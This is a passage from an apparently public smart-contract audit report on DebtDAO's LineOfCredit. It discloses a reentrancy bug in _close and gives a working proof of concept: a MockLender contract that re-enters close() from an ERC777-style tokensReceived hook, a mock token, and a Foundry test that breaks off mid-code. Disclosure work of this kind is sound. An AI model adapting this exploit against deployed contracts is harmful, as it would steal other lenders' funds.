0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/160\">[M-05] Reentrancy bug allows lender to steal other lenders funds</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/160\">0xdeadbeef0x</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/498\">SmartSek</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/451\">joestakey</a>, and <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/297\">hansfriese</a></em></p>\n<p>A reentrancy bug in <code>LineOfCredit.sol</code> allows the lender to steal other lenders tokens if they are lending the same tokens type (loss of funds).</p>\n<p>The  reentrancy occurs in the <code>_close(credit, id)</code> function in <code>LineOfCredit.sol</code>. The <code>credit[id]</code> state variable is cleared only after sendings tokens to the lender.</p>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L483\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L483</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"24\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if(credit.principal &gt; 0) { revert CloseFailedWithPrincipal(); }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // return the Lender&#39;s funds that are being repaid</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (credit.deposit + credit.interestRepaid &gt; 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            LineLib.sendOutTokenOrETH(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                credit.token,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                credit.lender,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                credit.deposit + credit.interestRepaid</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        delete credits[id]; // gas refunds</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // remove from active list</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ids.removePosition(id);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        unchecked { --count; }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // If all credit lines are closed the the overall Line of Credit facility is declared &#39;repaid&#39;.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (count == 0) { _updateStatus(LineLib.STATUS.REPAID); }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        emit CloseCreditPosition(id);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<h3 id=\"proof-of-concept-10\" style=\"position:relative;\"><a href=\"#proof-of-concept-10\" aria-label=\"proof of concept 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Reentrancy is possible if the borrower is lending tokens that can change the control flow. Such tokens are based on ERC20 such as ERC777, ERC223 or other customized ERC20 tokens that alert the receiver of transactions.\nExample of a real-world popular token that can change control flow is PNT (pNetwork).</p>\n<p>As the protocol supports any token listed on the oracle, if the oracle currently supports (or will support in the future) a feed of the above tokens, the bug is exploitable.</p>\n<p>If a reentrancy occurs in the <code>_close(credit, id)</code> function, the <code>credit[id]</code> state variable is cleared only after sendings tokens to the lender.\nA lender can abuse this by reentrancy to <code>close(id)</code> and retrieve <code>credit.deposit + credit.interestRepaid</code> amount of <code>credit.token</code>. A lender can repeat these processes as long as LineOfCredit has funds available.</p>\n<p>The POC will demonstrate the following flow:</p>\n<ol>\n<li>Borrower  adds a new credit with lender1 on 1000 tokens.</li>\n<li>Borrower lends 1000 from lender1</li>\n<li>Borrower repays debt</li>\n<li>Borrower adds a new credit with lender2 on 1000 tokens</li>\n<li>Borrower closes debt with lender1</li>\n<li>Lender1 receives 2000 tokens.</li>\n</ol>\n<p>Add the <code>MockLender.sol</code> to mock folder.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"25\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">pragma solidity 0.8.9;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { ILineOfCredit } from &quot;../interfaces/ILineOfCredit.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { Token777 } from &quot;./Token777.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">contract MockLender {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address owner;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ILineOfCredit line;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bytes32 id;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bool lock;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    event GotMoney(uint256 amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    constructor(address _line) public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        line = ILineOfCredit(_line);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        owner = msg.sender;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function addCredit(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint128 drate,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint128 frate,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 amount,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address token</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(msg.sender == owner, &quot;Only callable by owner&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Token777(token).approve(address(line), amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Token777(token).approve(address(owner), type(uint256).max);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Token777(token).mockAddToRegistry();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        id = line.addCredit(drate, frate, amount, token, address(this));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function tokensReceived(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address operator,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address from,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address to,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 amount,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes calldata userData,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes calldata operatorData</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        emit GotMoney(amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if(!lock){</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            lock = true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            line.close(id);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    receive() external payable {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>Add <code>Token777.sol</code> to mocks folder:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"26\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">pragma solidity 0.8.9;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import &quot;openzeppelin/token/ERC20/ERC20.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">interface IERC777Recipient {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function tokensReceived(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address operator,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address from,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address to,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 amount,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes calldata userData,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes calldata operatorData</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) external;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">contract Token777 is ERC20(&quot;Token used to trade&quot;, &quot;777&quot;) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    mapping(address =&gt; uint256) private _balances;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    mapping(address =&gt; address) private registry;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 private _totalSupply;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    string private _name;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    string private _symbol;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // ERC20-allowances</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    mapping(address =&gt; mapping(address =&gt; uint256)) private _allowances;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    event Test(address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    constructor() {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function mint(address account, uint256 amount) external returns(bool) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _mint(account, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function _mint(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address account,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 amount</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) internal virtual override{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(account != address(0), &quot;ERC777: mint to the zero address&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Update state variables</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _totalSupply += amount;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _balances[account] += amount;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        emit Test(account);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function balanceOf(address account) public view virtual override returns (uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return _balances[account];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function approve(address spender, uint256 value) public virtual override returns (bool) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address holder = _msgSender();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _approve(holder, spender, value);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">   function _approve(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address holder,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address spender,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 value</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) internal  virtual override {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(holder != address(0), &quot;ERC777: approve from the zero address&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(spender != address(0), &quot;ERC777: approve to the zero address&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _allowances[holder][spender] = value;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        emit Approval(holder, spender, value);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function transferFrom(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address holder,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address recipient,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 amount</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) public virtual override returns (bool) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address spender = _msgSender();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        emit Test(msg.sender);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _spendAllowance(holder, spender, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _send(holder, recipient, amount, &quot;&quot;, &quot;&quot;, false);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function allowance(address holder, address spender) public view virtual override returns (uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return _allowances[holder][spender];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function _spendAllowance(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address owner,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address spender,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 amount</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) internal override virtual {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        emit Test(msg.sender);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 currentAllowance = allowance(owner, spender);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (currentAllowance != type(uint256).max) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            require(currentAllowance &gt;= amount, &quot;ERC777: insufficient allowance&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            unchecked {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                _approve(owner, spender, currentAllowance - amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _send(_msgSender(), recipient, amount, &quot;&quot;, &quot;&quot;, false);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function _send(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address from,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address to,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 amount,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes memory userData,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes memory operatorData,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bool requireReceptionAck</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) internal virtual {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(from != address(0), &quot;ERC777: transfer from the zero address&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(to != address(0), &quot;ERC777: transfer to the zero address&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address operator = _msgSender();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _move(operator, from, to, amount, userData, operatorData);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _callTokensReceived(operator, from, to, amount, userData, operatorData, requireReceptionAck);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function _move(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address operator,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address from,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address to,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 amount,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes memory userData,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes memory operatorData</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) private {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 fromBalance = _balances[from];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(fromBalance &gt;= amount, &quot;ERC777: transfer amount exceeds balance&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        unchecked {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            _balances[from] = fromBalance - amount;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _balances[to] += amount;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function _callTokensReceived(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address operator,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address from,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address to,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 amount,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes memory userData,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes memory operatorData,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bool requireReceptionAck</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) private {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address implementer = registry[to];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (implementer != address(0)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            IERC777Recipient(implementer).tokensReceived(operator, from, to, amount, userData, operatorData);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function mockAddToRegistry() external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        registry[msg.sender] = msg.sender;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>Add the following imports to <code>LineOfCredit.t.sol</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"27\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">import { MockLender } from &quot;../mock/MockLender.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { Token777 } from &quot;../mock/Token777.sol&quot;;</span></span></code></pre>\n<p>Add the following test to <code>LineOfCredit.t.sol</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"28\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function test_reentrancy() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 lenderOneAmount = 1000;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 lenderTwoAmount = 1000;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Token777 tokenUsed = new Token777();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Create lenderController </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address lenderOneController = address(0xdeadbeef);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address lender2 = address(0x1337);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Create lenderContract </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(lenderOneController);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        MockLender lenderOneContract = new MockLender(address(line));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // give lenders their lend amount of token</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        tokenUsed.mint(address(lenderOneContract), lenderOneAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        tokenUsed.mint(address(lender2), lenderTwoAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // add support of the token to the SimpleOracle</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        oracle.changePrice(address(tokenUsed), 1000 * 1e8); // 1000 USD</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Borrowers adds credit line from lender2</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(borrower);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        line.addCredit(dRate, fRate, lenderOneAmount, address(tokenUsed), address(lenderOneContract));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // LenderOne adds credit line</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(lenderOneController);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        lenderOneContract.addCredit(dRate, fRate, lenderOneAmount, address(tokenUsed));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //borrow 1 ether</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes32 id_first = line.ids(0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(borrower);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        line.borrow(id_first, lenderOneAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Borrowers adds an additional credit line from lender2</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(borrower);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        line.addCredit(dRate, fRate, lenderTwoAmount, address(tokenUsed), address(lender2));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Lender2 adds an additional credit line from  </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(lender2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        tokenUsed.approve(address(line), lenderTwoAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        line.addCredit(dRate, fRate, lenderTwoAmount, address(tokenUsed),  address(lender2));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // repay all debt to lender 1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(borrower);</span></span>\n<span class=\"grvsc-line\"><span 